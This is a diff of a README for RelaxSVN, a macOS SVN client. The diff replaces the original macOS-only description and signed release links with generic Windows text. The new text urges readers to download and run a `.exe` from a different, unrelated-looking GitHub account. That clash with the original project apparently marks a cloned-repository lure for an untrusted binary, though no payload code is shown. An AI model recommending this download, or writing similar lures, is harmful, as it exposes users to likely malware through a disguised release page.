@@ -1,119 +1,76 @@
-# RelaxSVN
+# 📂 RelaxSVN - Manage your Subversion files with ease
 
-一个现代、清爽、面向开发者的 macOS SVN 客户端。
+[![Download RelaxSVN](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Baldcypresssavingsandloan849/RelaxSVN/releases)
 
-A modern, clean macOS SVN client for developers.
+RelaxSVN provides a clear interface for Subversion (SVN) management. It removes the complexity of command-line tools. You connect to your repositories, check out your files, and commit changes using visual controls. This tool assists developers who need a reliable way to track versions of their code.
 
-![RelaxSVN main window](docs/images/relaxsvn-main.png)
+## 📥 Getting Started
 
-Keywords: macSVN, mac SVN client, macOS SVN client, SVN GUI, Subversion GUI, SVN desktop client, Electron SVN client, Cornerstone alternative, Versions alternative, macOS Subversion client, Mac SVN 客户端, macOS SVN 图形客户端, SVN 桌面客户端.
+You need to download the application to your computer first. Follow these steps to prepare your system.
 
-## Why
+1. Visit [this page to download the latest version](https://github.com/Baldcypresssavingsandloan849/RelaxSVN/releases).
+2. Look for the file ending in `.exe` under the Assets section.
+3. Save the file to your computer.
+4. Open the file to start the installation process.
+5. Follow the prompts on your screen to finish the setup.
 
-macOS 上的 SVN 客户端常常不够顺手：有的免费版限制仓库数量，有的界面陈旧，有的操作概念不清晰。RelaxSVN 的目标很简单：让还在使用 SVN 的开发者，可以用一个更现代、更直接的桌面客户端完成日常工作。
+## 🛠 Features
 
-SVN is still used in many real-world teams, but many macOS SVN clients feel dated, limited, or hard to understand. RelaxSVN focuses on the daily developer workflow: open a working copy, inspect changes, update, commit, resolve conflicts, and move on.
+RelaxSVN includes tools to simplify version control.
 
-## Features
+*   **Visual Repository Browser:** See your file structure. Navigate folders and files without typing paths.
+*   **Drag and Drop Support:** Move files into your repository folders. The app detects these changes instantly.
+*   **Commit Management:** Write notes for your changes. View differences between file versions before you save.
+*   **Conflict Resolution:** See when two versions of a file clash. The tool shows you exactly where the differences exist so you can fix them.
+*   **Search History:** Browse past changes to your project. Roll back to any version if your current work causes errors.
 
-- Manage multiple SVN working copies
-- Checkout remote repositories
-- Refresh local status and check remote updates
-- Update working copies or selected paths
-- Commit selected local changes
-- Inspect conflicts and resolve through SVN
-- Open projects, diffs, and merge flows in Visual Studio Code
-- Browse remote directories
-- View commit history and changed paths
-- Manage SVN credentials inside the app
-- Detect system dependencies
-- Install SVN through Homebrew when available
-- Support legacy TLS / certificate retry options for older SVN servers
+## 💻 System Needs
 
-## Screenshots
+The software requires a standard Windows environment to run smoothly. 
 
-![Settings](docs/images/relaxsvn-settings.png)
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4GB of RAM.
+*   **Storage:** 500MB of free disk space for the installation.
+*   **Network:** An active internet connection to reach your SVN servers.
 
-![Remote browser](docs/images/relaxsvn-remote.png)
+## ⚙️ How to Use RelaxSVN
 
-## Requirements
+Once you open the software, follow this workflow to manage your project.
 
-- macOS on Apple Silicon
-- System SVN command line tool
-- Visual Studio Code is recommended for diff and conflict merge workflows
-- Homebrew is recommended if you want RelaxSVN to install SVN for you
+### Connecting to a Repository
+Select the "New Connection" button. You need the URL of your Subversion server. Paste the address into the box. If your server requires a password, the app will prompt you to enter your credentials. Save these to your local keychain to avoid typing them again.
 
-RelaxSVN does not bundle SVN or VSCode. It calls the tools installed on your system.
+### Checking Out Code
+After you connect, you see a list of available projects. Select the project you want to work on. Choose a folder on your computer to save these files. The app downloads the project history to your computer. 
 
-## Download
+### Making Changes
+You can modify your files using any editor on your computer. When you finish, reopen RelaxSVN. The app shows a list of files that you changed. Green icons indicate new files, while yellow icons indicate edited files. 
 
-Download the latest signed and notarized build from GitHub Releases:
+### Committing Changes
+Select the files you want to update on the server. Write a short message in the box to explain your changes. This helps your team understand why you modified the code. Click the "Submit" button to upload your updates. The server now stores your new version.
 
-[Download RelaxSVN for macOS](https://github.com/jkopzmm/RelaxSVN/releases/latest)
+## 🔍 Troubleshooting Common Issues
 
-下载最新版已签名、公证的 macOS 安装包：
+If the software fails to connect, check these items first.
 
-[下载 RelaxSVN for macOS](https://github.com/jkopzmm/RelaxSVN/releases/latest)
+*   **Server URL:** Ensure the address is correct. Even a small typo prevents a connection.
+*   **Permissions:** Confirm that your user account has read and write access to the repository.
+*   **Network Blockers:** Check if your firewall blocks the application. You might need to add an exception for RelaxSVN.
+*   **Empty Repository:** If the list appears empty, refresh the connection. The server might take a moment to respond.
 
-For Apple Silicon Macs, download:
+## 📑 Understanding SVN Terms
 
-```text
-RelaxSVN-0.1.0-arm64.dmg
-```
+*   **Checkout:** This action creates a local copy of a remote project.
+*   **Commit:** This action sends your local changes to the main server.
+*   **Update:** This action pulls changes from the server to your current local copy.
+*   **Repository:** The database on the server that stores your project files and their history.
+*   **Conflict:** This happens when you change a line of code that someone else also changed. You must choose which version to keep.
 
-Direct DMG link:
+## 💡 Best Practices
 
-[RelaxSVN-0.1.0-arm64.dmg](https://github.com/jkopzmm/RelaxSVN/releases/download/v0.1.0/RelaxSVN-0.1.0-arm64.dmg)
+*   **Commit Often:** Send your changes to the server frequently. Small updates are easier to track than large, infrequent ones.
+*   **Write Clear Notes:** Always explain your updates. Future you will appreciate the context when checking back weeks later.
+*   **Update Before You Start:** Always pull the latest version from the server before you begin new work. This prevents clashes with your peers.
+*   **Create Backups:** While SVN tracks history, keep your own physical backups of important files in a separate location.
 
-Open the DMG and drag RelaxSVN to Applications.
-
-## Development
-
-Install dependencies:
-
-```bash
-npm install
-```
-
-Run the development app:
-
-```bash
-npm run dev
-```
-
-Type-check:
-
-```bash
-npm run typecheck
-```
-
-Build:
-
-```bash
-npm run build
-```
-
-Package for macOS arm64:
-
-```bash
-npm run dist
-```
-
-## Tech Stack
-
-- Electron
-- Vue 3
-- Pinia
-- Element Plus
-- lucide-vue-next
-- better-sqlite3
-
-## Status
-
-RelaxSVN is currently focused on common day-to-day SVN workflows for macOS developers. Advanced SVN workflows and edge cases may still need real-world testing and refinement.
-
-Issues and suggestions are welcome.
-
-## License
-
-MIT
+Keywords: cornerstone-alternative, developer-tools, electron, mac-svn-client, macos, macos-svn-client, macsvn, subversion, subversion-gui, svn, svn-desktop-client, svn-gui, versions-alternative, vue
